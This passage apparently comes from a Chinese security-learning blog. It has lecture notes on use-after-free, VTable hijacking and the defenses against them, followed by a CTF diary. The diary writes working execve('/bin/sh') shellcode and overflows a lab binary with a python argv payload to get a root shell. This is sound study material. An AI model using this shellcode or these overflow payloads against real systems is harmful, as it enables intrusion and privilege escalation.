</p>\n</li>\n<li><ul>\n<li>新的分配请求总是能被TOP      chunk满足</li>\n<li>这个（比实际大的）TOP      chunk可以覆盖包括 code/data,e.g.,got表，那么任意地址都可以被分配请求返回</li>\n</ul>\n</li>\n</ul>\n<p><strong>防御堆溢出</strong></p>\n<ul>\n<li><p>cookie </p>\n</li>\n<li><ul>\n<li>与StackGuard/GS（在返回地址附近插入cookie）类似，我们可以在堆对象附近插入cookie。</li>\n</ul>\n</li>\n<li><p>但是 </p>\n</li>\n<li><ul>\n<li><p>运行时开销非常大</p>\n</li>\n<li><p>没有一个好的时间节点进行cookie检查：      </p>\n</li>\n<li><ul>\n<li>对于栈，在函数返回时进行检查</li>\n<li>对于堆，一个还算合理的适当malloc/free被调用时进行检查，但其可能无法对被损害的对象进行操作。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>Use-After-Free (UAF)</strong></p>\n<ul>\n<li><p>漏洞 </p>\n</li>\n<li><ul>\n<li>被释放的内存被再次释放？</li>\n<li>被释放的内存被损坏？</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205716558.png\" alt=\"image-20210625205716558\" style=\"zoom:50%;\" />\n\n<ul>\n<li>攻击<ul>\n<li>最常见的UAF攻击：VTable Hijacking</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205758688.png\" alt=\"image-20210625205758688\" style=\"zoom:50%;\" />\n\n<p><strong>UAF vulnerability(MS12-063)</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205915719.png\" alt=\"image-20210625205915719\" style=\"zoom:50%;\" />\n\n<p><strong>UAF vulnerability(MS12-063)</strong><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205933444.png\" style=\"zoom:50%;\" /></p>\n<p><strong>动态分配的VTable(c++)</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205958106.png\" alt=\"image-20210625205958106\" style=\"zoom:50%;\" />\n\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">foo</span><span class=\"params\">(Base2* obj)</span></span>&#123;</span><br><span class=\"line\">    obj-&gt;<span class=\"built_in\">vg4</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    Base2* obj = <span class=\"keyword\">new</span> <span class=\"built_in\">Sub</span>();</span><br><span class=\"line\">    <span class=\"built_in\">foo</span>(obj);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code section</span><br><span class=\"line\">; Function main()</span><br><span class=\"line\">push SIZE</span><br><span class=\"line\">call malloc()</span><br><span class=\"line\">mov ecx, eax</span><br><span class=\"line\">call Sub::Sub()</span><br><span class=\"line\">; now ECX points to the Sub object</span><br><span class=\"line\">add ecx, 8</span><br><span class=\"line\">; now ECX points to the Sub::Base2 object</span><br><span class=\"line\">call foo()</span><br><span class=\"line\">ret</span><br><span class=\"line\">; Function foo()</span><br><span class=\"line\">mov eax, [ecx]      ; read vfptr of Base2</span><br><span class=\"line\">mov edx, [eax+0x0C] ; get vg4() from vtable</span><br><span class=\"line\">call edx            ; call Base2::vg4()</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n\n<p><strong>VTable Hijacking 分类</strong></p>\n<ul>\n<li><p>损坏VTable </p>\n</li>\n<li><ul>\n<li>覆盖VTable</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210119072.png\" alt=\"image-20210625210119072\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>VTable注入 </p>\n</li>\n<li><ul>\n<li>覆盖vfptr</li>\n<li>指向假的VTable</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210150396.png\" alt=\"image-20210625210150396\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>VTable重用 </p>\n</li>\n<li><ul>\n<li>覆盖vfptr</li>\n<li>指向包括VTable，数据等</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210205114.png\" alt=\"image-20210625210205114\" style=\"zoom:50%;\" />\n\n<p><strong>VTable Hijacking 实战</strong></p>\n<ul>\n<li>Pwn2Own 2014  firefox</li>\n<li>Pwn2Own 2014  chrome</li>\n<li>CVE-2014-1772   IE</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code section</span><br><span class=\"line\">; Function main()</span><br><span class=\"line\">push SIZE</span><br><span class=\"line\">call malloc()</span><br><span class=\"line\">mov ecx, eax</span><br><span class=\"line\">call Sub::Sub()</span><br><span class=\"line\">; now ECX points to the Sub object</span><br><span class=\"line\">add ecx, 8</span><br><span class=\"line\">; now ECX points to the Sub::Base2 object</span><br><span class=\"line\">call foo()</span><br><span class=\"line\">ret</span><br><span class=\"line\">; Function foo()</span><br><span class=\"line\">mov eax, [ecx]      ; read vfptr of Base2</span><br><span class=\"line\">mov edx, [eax+0x0C] ; get vg4() from vtable</span><br><span class=\"line\">call edx            ; call Base2::vg4()</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210304071.png\" alt=\"image-20210625210304071\" style=\"zoom:50%;\" />\n\n<p><strong>防御VTable Hijacking</strong></p>\n<p><strong>VTint</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>-</strong></th>\n<th><strong>Attack</strong></th>\n<th><strong>Requirement</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>VTable  破坏</td>\n<td>覆盖  VTable</td>\n<td>VTable可写</td>\n</tr>\n<tr>\n<td>VTable  注入</td>\n<td>覆盖vfptr，指向被注入的VTable</td>\n<td>VTable可写</td>\n</tr>\n<tr>\n<td>VTable  重用</td>\n<td>覆盖vfptr，指向包括VTable，数据</td>\n<td>形似VTable的数据，包括VTable</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th><strong>-</strong></th>\n<th><strong>Attack</strong></th>\n<th><strong>Requirement</strong></th>\n<th><strong>解决方案</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>VTable  破坏</td>\n<td>覆盖  VTable</td>\n<td>VTable可写</td>\n<td>VTable只读</td>\n</tr>\n<tr>\n<td>VTable  注入</td>\n<td>覆盖vfptr，指向被注入的VTable</td>\n<td>VTable可写</td>\n<td>VTable只读</td>\n</tr>\n<tr>\n<td>VTable  重用</td>\n<td>覆盖vfptr，指向包括VTable，数据</td>\n<td>形似VTable的数据，包括VTable</td>\n<td>不同的VTable/数据</td>\n</tr>\n</tbody></table>\n<p><strong>VTint vs. DEP</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>-</strong></th>\n<th><strong>VTint</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>VTable  破坏</td>\n<td>VTable只读</td>\n</tr>\n<tr>\n<td>VTable  注入</td>\n<td>VTable只读</td>\n</tr>\n<tr>\n<td>VTable  重用</td>\n<td>不同的VTable/数据</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th><strong>-</strong></th>\n<th><strong>DEP</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>VTable  破坏</td>\n<td>只读的代码段</td>\n</tr>\n<tr>\n<td>VTable  注入</td>\n<td>只读的代码段(可写的段不会被执行)</td>\n</tr>\n<tr>\n<td>VTable  重用</td>\n<td>NO</td>\n</tr>\n</tbody></table>\n<ul>\n<li><p>与DEP的相同之处 </p>\n</li>\n<li><ul>\n<li>轻量级，可以是二进制可兼容的。</li>\n</ul>\n</li>\n<li><p>不同 </p>\n</li>\n<li><ul>\n<li>加固后，可攻击面更小</li>\n</ul>\n</li>\n</ul>\n<p><strong>二进制级防护：vfGuard</strong></p>\n<p>NDSS’15: Dynamic binary instrumentation</p>\n<p>- 在运行时检查虚拟调用指令（使用PIN）</p>\n<p>- 针对指令使用不同策略</p>\n<ul>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>易于扩展，去执行不同策略</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>开销大（PIN的开销*118%）</li>\n<li>无法防御VTables重用攻击</li>\n</ul>\n</li>\n</ul>\n<p><strong>源代码级防护：vfGuard</strong></p>\n<ul>\n<li><p>Microsoft IE10,     Core Objects </p>\n</li>\n<li><ul>\n<li>在VTable结束地方的特殊cookies</li>\n</ul>\n</li>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>轻量级</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>只防御核心对象Core      Objects</li>\n<li>不能应付VTable注入</li>\n<li>信息泄漏</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210454607.png\" alt=\"image-20210625210454607\" style=\"zoom:50%;\" />\n\n<p><strong>源代码级防护：SafeDispatch</strong></p>\n<ul>\n<li><p>NDSS’14, LLVM-based     </p>\n</li>\n<li><ul>\n<li>静态计算一系列合法目标</li>\n<li>根据计算结果进行动态验证</li>\n</ul>\n</li>\n<li><p>策略1: VTable Check </p>\n</li>\n<li><ul>\n<li><p>劣势： </p>\n</li>\n<li><ul>\n<li>编译阶段需要耗费大量时间去分析</li>\n<li>高运行时开销（~30%）</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>策略2: moethod Check </p>\n</li>\n<li><ul>\n<li><p>劣势： </p>\n</li>\n<li><ul>\n<li>编译阶段需要耗费大量时间去分析</li>\n<li>高运行时开销（~7%）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>源代码级防护：Forward Edge CFI</strong></p>\n<ul>\n<li><p>GCC-VTV     [Usenix’14], whitelist-based</p>\n<p>- 在编译阶段计算一组不完整的合法目标<br>- 在加载是通过初始化函数合并不完整的数据<br>- 在运行时检验是否合法</p>\n</li>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>支持增量构建</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>运行时操作繁琐</li>\n</ul>\n</li>\n</ul>\n<p><strong>源代码级别的防护：RockJIT</strong></p>\n<ul>\n<li><p>CCS’15, CFI-based </p>\n</li>\n<li><ul>\n<li>在编译阶段收集类型信息</li>\n<li>根据收集到的信息计算加载时转移目标的等价类别</li>\n<li>更新CFI检查，在加载时只允许间接传输到一个等价类</li>\n</ul>\n</li>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>支持增量构造</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>加载时开销大</li>\n</ul>\n</li>\n</ul>\n<p>头疼≧ ﹏ ≦~~~</p>\n"},{"_content":"```\n学习日记5\n```\n\n**shellcode**\n\n是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。\n\nshellcode基本的编写方式：\n\n- 编写c程序实现功能\n- 使用汇编来替代函数调用等\n- 汇编编译链接，获取机器码\n\n这里使用c语言来进行编写。\n\n```c\n#include<stdio.h>\nint main()\n{\n    char *name[2];\n    name[0]=\"/bin/sh\";\n    name[1]=NULL;\n    execve(name[0],name,NULL);\n}\n```\n\n其中execve进行系统调用，通过name[0]提供的参数\"/bin/sh\"起一个shell。 execve（参数1，参数2，参数3） 参数1：命令所在路径 参数2：命令的集合 参数3：传递给执行文件的环境变量集尝试编译运行。\n\n```shell\n$ gcc shell.c -o shell\n$ ./shell\n$ echo u got it\nu got it\n```\n\n用gdb查看\n\n```assembly\n$ gdb shell -q\npwndbg: loaded 164 commands. Type pwndbg [filter] for a list.\npwndbg: created $rebase, $ida gdb functions (can be used with print/break)\nReading symbols from shell...(no debugging symbols found)...done.\npwndbg> disass main\nDump of assembler code for function main:\n   0x0000000000400596 <+0>: push   rbp\n   0x0000000000400597 <+1>: mov    rbp,rsp\n   0x000000000040059a <+4>: sub    rsp,0x20\n   0x000000000040059e <+8>: mov    rax,QWORD PTR fs:0x28\n   0x00000000004005a7 <+17>:    mov    QWORD PTR [rbp-0x8],rax\n   0x00000000004005ab <+21>:    xor    eax,eax\n   0x00000000004005ad <+23>:    mov    QWORD PTR [rbp-0x20],0x400674\n   0x00000000004005b5 <+31>:    mov    QWORD PTR [rbp-0x18],0x0\n   0x00000000004005bd <+39>:    mov    rax,QWORD PTR [rbp-0x20]\n   0x00000000004005c1 <+43>:    lea    rcx,[rbp-0x20]\n   0x00000000004005c5 <+47>:    mov    edx,0x0\n   0x00000000004005ca <+52>:    mov    rsi,rcx\n   0x00000000004005cd <+55>:    mov    rdi,rax\n   0x00000000004005d0 <+58>:    call   0x400480 <execve@plt>\n   0x00000000004005d5 <+63>:    mov    eax,0x0\n   0x00000000004005da <+68>:    mov    rdx,QWORD PTR [rbp-0x8]\n   0x00000000004005de <+72>:    xor    rdx,QWORD PTR fs:0x28\n   0x00000000004005e7 <+81>:    je     0x4005ee <main+88>\n   0x00000000004005e9 <+83>:    call   0x400460 <__stack_chk_fail@plt>\n   0x00000000004005ee <+88>:    leave\n   0x00000000004005ef <+89>:    ret\nEnd of assembler dump.\npwndbg>\n```\n\n其中关键点在 \n\n```assembly\n0x00000000004005c5 <+47>:   mov    edx,0x0\n0x00000000004005ca <+52>:   mov    rsi,rcx\n0x00000000004005cd <+55>:   mov    rdi,rax\n0x00000000004005d0 <+58>:   call   0x400480 <execve@plt>\n```\n\n传递了三个参数并且call execve()。 直接使用这四条指令显然是不行的，shellcode需要能够独立运行并且尽量短小，这里的call 0x400480 <execve@plt>依赖plt表，前面的参数传递也依赖程序的数据段等，我们需要用汇编来重写这里的代码。 对于call 0x400480 <execve@plt>，我们可以用系统调用来重写，execve的调用号为：0xb，那么就有 \n\n```assembly\nmov al,0xb\nint 0x80\n```\n\n这里的0x80是根据al的值进行系统调用。 为了传参方便，这里采用32位汇编的写法，把参数push到栈上就可以传递参数了。 先将\"/bin/sh\"压栈\n\n```assembly\nxor eax,eax\npush eax\npush 0x68732f2f\npush 0x6e69622f\n```\n\n注意这里用xor eax,eax把eax置0，不使用mov eax,0的原因是这样会出现\\x00，shellcode会被gets()这类函数截断。 esp指向当前栈顶，此时即指向\"/bin/sh\",我们把esp保存到ebx \n\n```assembly\nmov ebx,esp\n```\n\n现在把两个参数压栈，eax为NULL(0)，ebx为\"/bin/sh\"的地址\n\n```assembly\npush eax\npush ebx\n```\n\n此时esp指向数组argv，把它赋值给ecx。\n\n```assembly\nmov ecx,esp\nxor edx,edx\nmov al,0xb\nint 0x80       ;通过中断0x80进行系统调用\n```\n\n所以有完整的代码： \n\n```assembly\nsection .text\nglobal _start\n_start:\nxor eax,eax\npush eax\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\npush eax\npush ebx\nmov ecx,esp\nxor edx,edx\nmov al,0xb\nint 0x80\n```\n\n保存为shell.asm，使用nasm编译，链接，运行（nasm可以使用 sudo apt-get install nasm 进行安装）\n\n```shell\n$ nasm -f elf32 shell.asm -o shell.o\n$ ld -m elf_i386 -o shell shell.o\n$ ./shell\n$ echo u got it\nu got it\n```\n\n成功了，使用objdump提取\n\n```assembly\n$ objdump -d shell\nshell:     file format elf32-i386\nDisassembly of section .text:\n08048060 <_start>:\n 8048060:   31 c0                   xor    %eax,%eax\n 8048062:   50                      push   %eax\n 8048063:   68 2f 2f 73 68          push   $0x68732f2f\n 8048068:   68 2f 62 69 6e          push   $0x6e69622f\n 804806d:   89 e3                   mov    %esp,%ebx\n 804806f:   50                      push   %eax\n 8048070:   53                      push   %ebx\n 8048071:   89 e1                   mov    %esp,%ecx\n 8048073:   31 d2                   xor    %edx,%edx\n 8048075:   b0 0b                   mov    $0xb,%al\n 8048077:   cd 80                   int    $0x80\n```\n\n这样就提取到了,下面可以写个c程序验证一下。\n\n```shell\n#include <stdio.h>\nchar shellcode[]=\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\";\nint main()\n{\n    void (*fp) (void);\n    fp=(void *)shellcode;\n    fp();\n}\n\n$ gcc auth.c -fno-stack-protector -o auth -z execstack -m32\n$ ./auth\n$ echo u got it\nu got it\n```\n\n**栈溢出之篡改邻近变量**\n\n1. 通过-fno-stack-protector和-m32参数从gcc编译stack0.c文件。\n2. 运行编译后的程序，通过缓冲区溢出修改与字符串数组相邻的变量，得到输出\"you     have changed the 'modified' variable\"\n3. 运行stack1程序，通过栈溢出得到输出\"you     have correctly got the variable to the right value\"\n\n缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。\n\n**栈溢出之ShellCode简例**\n\n```c\nchar *pwnthis()\n{\n  char s; // [sp+0h] [bp-48h]@1\nreturn gets(&s);\n}\nint win()\n{\n  return puts(\"code flow successfully changed\");\n}\n```\n\n```assembly\n.text:08048454 ; ==== S U B R O U T I N E ==========================================================================\n.text:08048454\n.text:08048454 ; Attributes: bp-based frame\n.text:08048454\n.text:08048454                 public pwnthis\n.text:08048454 pwnthis         proc near               ; CODE XREF: main+11\u0019p\n.text:08048454\n.text:08048454 s               = byte ptr -48h\n.text:08048454\n.text:08048454                 push    ebp\n.text:08048455                 mov     ebp, esp\n.text:08048457                 sub     esp, 48h\n.text:0804845A                 sub     esp, 0Ch\n.text:0804845D                 lea     eax, [ebp+s]\n.text:08048460                 push    eax             ; s\n.text:08048461                 call    _gets\n.text:08048466                 add     esp, 10h\n.text:08048469                 nop\n.text:0804846A                 leave\n.text:0804846B                 retn\n.text:0804846B pwnthis         endp\n\n```\n\npwnthis()函数中有且仅有一个危险函数gets(&s);,目标仍然是跳转到函数win()上获得输出code flow successfully changed。\n\n在IDA pro中双击 char s查看栈的结构\n\n```assembly\n-00000048 s               db ?\n-00000047                 db ? ; undefined\n-00000046                 db ? ; undefined\n-00000045                 db ? ; undefined\n-00000044                 db ? ; undefined\n-00000043                 db ? ; undefined\n-00000042                 db ? ; undefined\n-00000041                 db ? ; undefined\n-00000040                 db ? ; undefined\n-0000003F                 db ? ; undefined\n-0000003E                 db ? ; undefined\n-0000003D                 db ? ; undefined\n-0000003C                 db ? ; undefined\n-0000003B                 db ? ; undefined\n-0000003A                 db ? ; undefined\n-00000039                 db ? ; undefined\n-00000038                 db ? ; undefined\n-00000037                 db ? ; undefined\n-00000036                 db ? ; undefined\n-00000035                 db ? ; undefined\n-00000034                 db ? ; undefined\n-00000033                 db ? ; undefined\n-00000032                 db ? ; undefined\n-00000031                 db ? ; undefined\n-00000030                 db ? ; undefined\n-0000002F                 db ? ; undefined\n-0000002E                 db ? ; undefined\n-0000002D                 db ? ; undefined\n-0000002C                 db ? ; undefined\n-0000002B                 db ? ; undefined\n-0000002A                 db ? ; undefined\n-00000029                 db ? ; undefined\n-00000028                 db ? ; undefined\n-00000027                 db ? ; undefined\n-00000026                 db ? ; undefined\n-00000025                 db ? ; undefined\n-00000024                 db ? ; undefined\n-00000023                 db ? ; undefined\n-00000022                 db ? ; undefined\n-00000021                 db ? ; undefined\n-00000020                 db ? ; undefined\n-0000001F                 db ? ; undefined\n-0000001E                 db ? ; undefined\n-0000001D                 db ? ; undefined\n-0000001C                 db ? ; undefined\n-0000001B                 db ? ; undefined\n-0000001A                 db ? ; undefined\n-00000019                 db ? ; undefined\n-00000018                 db ? ; undefined\n-00000017                 db ? ; undefined\n-00000016                 db ? ; undefined\n-00000015                 db ? ; undefined\n-00000014                 db ? ; undefined\n-00000013                 db ? ; undefined\n-00000012                 db ? ; undefined\n-00000011                 db ? ; undefined\n-00000010                 db ? ; undefined\n-0000000F                 db ? ; undefined\n-0000000E                 db ? ; undefined\n-0000000D                 db ? ; undefined\n-0000000C                 db ? ; undefined\n-0000000B                 db ? ; undefined\n-0000000A                 db ? ; undefined\n-00000009                 db ? ; undefined\n-00000008                 db ? ; undefined\n-00000007                 db ? ; undefined\n-00000006                 db ? ; undefined\n-00000005                 db ? ; undefined\n-00000004                 db ? ; undefined\n-00000003                 db ? ; undefined\n-00000002                 db ? ; undefined\n-00000001                 db ? ; undefined\n+00000000  s              db 4 dup(?)\n+00000004  r              db 4 dup(?)\n```\n\n其中 48处的s是指字符数组s，00处的s指保存在栈上的寄存器，r指的是返回地址，我们的目标就是覆盖返回地址，使函数在执行ret指令时，将我们覆盖的返回地址的值pop弹出到eip，从而改变程序的执行流。\n\n堆栈是一块保存数据的连续内存。 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部。 堆栈的底部在一个固定的地址。 堆栈的大小在运行时由内核动态地调整。 CPU实现指令 PUSH和POP， 向堆栈中添加元素和从中移去元素。 堆栈由逻辑堆栈帧组成。 当调用函数时逻辑堆栈帧被压入栈中， 当函数返回时逻辑 堆栈帧被从栈中弹出。 堆栈帧包括函数的参数， 函数的局部变量， 以及恢复前一个堆栈 帧所需要的数据， 其中包括在函数调用时指令指针(IP)的值。 堆栈既可以向下增长(向内存低地址)也可以向上增长， 这依赖于具体的实现。 在我 们的例子中， 堆栈是向下增长的。 这是很多计算机的实现方式， 包括Intel， Motorola， SPARC和MIPS处理器。 堆栈指针(SP)也是依赖于具体实现的。 它可以指向堆栈的最后地址， 或者指向堆栈之后的下一个空闲可用地址。 在我们的讨论当中， SP指向堆栈的最后地址。 除了堆栈指针(SP指向堆栈顶部的的低地址)之外， 为了使用方便还有指向帧内固定 地址的指针叫做帧指针(FP)。 有些文章把它叫做局部基指针(LB-local base pointer)。 从理论上来说， 局部变量可以用SP加偏移量来引用。 然而， 当有字被压栈和出栈后， 这 些偏移量就变了。 尽管在某些情况下编译器能够跟踪栈中的字操作， 由此可以修正偏移 量， 但是在某些情况下不能。 而且在所有情况下， 要引入可观的管理开销。 而且在有些 机器上， 比如Intel处理器， 由SP加偏移量访问一个变量需要多条指令才能实现。 因此， 许多编译器使用第二个寄存器， FP， 对于局部变量和函数参数都可以引用， 因为它们到FP的距离不会受到PUSH和POP操作的影响。 在Intel CPU中， BP(EBP)用于这 个目的。 在Motorola CPU中， 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP。 考虑到我们堆栈的增长方向， 从FP的位置开始计算， 函数参数的偏移量是正值， 而局部 变量的偏移量是负值。 当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以 恢复)。 然后它把SP复制到FP， 创建新的FP， 把SP向前移动为局部变量保留空间。 这称为 例程的序幕(prolog)工作。 当例程退出时， 堆栈必须被清除干净， 这称为例程的收尾 (epilog)工作。 Intel的ENTER和LEAVE指令， Motorola的LINK和UNLINK指令， 都可以用于 有效地序幕和收尾工作。\n\n**步骤1：** 程序源代码\n\n```c\nvoid vuln(int tmp, char *str) {\n    int win = tmp;\n    char buf[64];\n    strcpy(buf, str);\n    dump_stack((void **) buf, 23, (void **) &tmp);\n    printf(\"win = %d\\n\", win);\n    if (win == 1) {\n        execl(\"/bin/sh\", \"sh\", NULL);\n    } else {\n        printf(\"Sorry, you lose.\\n\");\n    }\n    exit(0);\n}\nint main(int argc, char **argv) {\n    if (argc != 2) {\n        printf(\"Usage: stack_overwrite [str]\\n\");\n        return 1;\n    }\nuid_t euid = geteuid();\n    setresuid(euid, euid, euid);\n    vuln(0, argv[1]);\n    return 0;\n}\n```\n\n**步骤2：** 首先，我们打开平台，点击操作机，点击通过web ssh登录进入控制台。\n\n**步骤3：** 我们输入ls，查看当前文件夹下有三个文件，我们尝试cat flag，发现权限缺失，所以我们尝试利用overflow1-3948d17028101c40的漏洞进行攻击。\n\n**步骤4：** 首先，我们的输入是程序的命令行参数。第二，如果我们可以设置win变量等于1，我们会得到一个shell！ 让我们进行cat flag。\n\n```assembly\n$ ./overflow1-3948d17028101c40 $(python -c 'print \"A\"*64 + \"B\"')\nStack dump:\n0xffa81994: 0xffa82845 (second argument)\n0xffa81990: 0x00000000 (first argument)\n0xffa8198c: 0x0804870f (saved eip)\n0xffa81988: 0xffa819b8 (saved ebp)\n0xffa81984: 0xf779c000\n0xffa81980: 0xf76a8a00\n0xffa8197c: 0x00000042\n0xffa81978: 0x41414141\n0xffa81974: 0x41414141\n0xffa81970: 0x41414141\n0xffa8196c: 0x41414141\n0xffa81968: 0x41414141\n0xffa81964: 0x41414141\n0xffa81960: 0x41414141\n0xffa8195c: 0x41414141\n0xffa81958: 0x41414141\n0xffa81954: 0x41414141\n0xffa81950: 0x41414141\n0xffa8194c: 0x41414141\n0xffa81948: 0x41414141\n0xffa81944: 0x41414141\n0xffa81940: 0x41414141\n0xffa8193c: 0x41414141 (beginning of buffer)\nwin = 66\nSorry, you lose.\n```\n\n**步骤5：** 你会看到，如果我们填满了缓冲区（“A”* 64）和一个\"B\"字母，win的值会改变。 对于那些不知道的人，“B”的ascii值是66，这意味着我们可以控制win变量。 我们所要做的就是提交一个ascii值为1的字符。由于这是不可打印的，我们将在python中使用转义序列。\n\n```assembly\n$ ./overflow1-3948d17028101c40 $(python -c 'print \"A\"*64 + \"\\x01\"')\nStack dump:\n0xff828874: 0xff829848 (second argument)\n0xff828870: 0x00000000 (first argument)\n0xff82886c: 0x0804870f (saved eip)\n0xff828868: 0xff828898 (saved ebp)\n0xff828864: 0xf77b7000\n0xff828860: 0xf76c3aa7\n0xff82885c: 0x00000001\n0xff828858: 0x41414141\n0xff828854: 0x41414141\n0xff828850: 0x41414141\n0xff82884c: 0x41414141\n0xff828848: 0x41414141\n0xff828844: 0x41414141\n0xff828840: 0x41414141\n0xff82883c: 0x41414141\n0xff828838: 0x41414141\n0xff828834: 0x41414141\n0xff828830: 0x41414141\n0xff82882c: 0x41414141\n0xff828828: 0x41414141\n0xff828824: 0x41414141\n0xff828820: 0x41414141\n0xff82881c: 0x41414141 (beginning of buffer)\nwin = 1\n$\n```\n\n**步骤6：** 之后，我们输入id，发现我们已经拿到了root的权限。然后我们再cat flag，这次便成功获取到flag了。\n\n","source":"_posts/ctfpwn5.md","raw":"```\n学习日记5\n```\n\n**shellcode**\n\n是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。\n\nshellcode基本的编写方式：\n\n- 编写c程序实现功能\n- 使用汇编来替代函数调用等\n- 汇编编译链接，获取机器码\n\n这里使用c语言来进行编写。\n\n```c\n#include<stdio.h>\nint main()\n{\n    char *name[2];\n    name[0]=\"/bin/sh\";\n    name[1]=NULL;\n    execve(name[0],name,NULL);\n}\n```\n\n其中execve进行系统调用，通过name[0]提供的参数\"/bin/sh\"起一个shell。 execve（参数1，参数2，参数3） 参数1：命令所在路径 参数2：命令的集合 参数3：传递给执行文件的环境变量集尝试编译运行。\n\n```shell\n$ gcc shell.c -o shell\n$ ./shell\n$ echo u got it\nu got it\n```\n\n用gdb查看\n\n```assembly\n$ gdb shell -q\npwndbg: loaded 164 commands. Type pwndbg [filter] for a list.\npwndbg: created $rebase, $ida gdb functions (can be used with print/break)\nReading symbols from shell...(no debugging symbols found)...done.\npwndbg> disass main\nDump of assembler code for function main:\n   0x0000000000400596 <+0>: push   rbp\n   0x0000000000400597 <+1>: mov    rbp,rsp\n   0x000000000040059a <+4>: sub    rsp,0x20\n   0x000000000040059e <+8>: mov    rax,QWORD PTR fs:0x28\n   0x00000000004005a7 <+17>:    mov    QWORD PTR [rbp-0x8],rax\n   0x00000000004005ab <+21>:    xor    eax,eax\n   0x00000000004005ad <+23>:    mov    QWORD PTR [rbp-0x20],0x400674\n   0x00000000004005b5 <+31>:    mov    QWORD PTR [rbp-0x18],0x0\n   0x00000000004005bd <+39>:    mov    rax,QWORD PTR [rbp-0x20]\n   0x00000000004005c1 <+43>:    lea    rcx,[rbp-0x20]\n   0x00000000004005c5 <+47>:    mov    edx,0x0\n   0x00000000004005ca <+52>:    mov    rsi,rcx\n  